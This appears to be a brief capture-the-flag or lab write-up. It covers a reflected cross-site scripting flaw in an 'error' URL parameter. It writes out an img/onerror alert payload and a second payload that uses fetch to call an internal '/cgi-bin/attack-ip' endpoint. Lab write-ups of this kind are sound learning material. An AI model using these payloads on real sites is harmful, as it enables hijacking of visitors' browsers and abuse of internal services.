
When I put a name and a domain, and click attack domain, it shows an error.

I see that the error is being reflected from the url

I find a XSS there after writing:

http://83.136.253.40:40650/?error=%3Cimg%20src=%22x%22%20onerror=%22alert(1)%22%3E

this opens an alert.

<img%20src="x"%20onerror="fetch(/cgi-bin/attack-ip?target=127.0.0.1&name=hacker%27).then(r%20=>%20r.text()).then(t%20=>%20console.log(t))"%20/>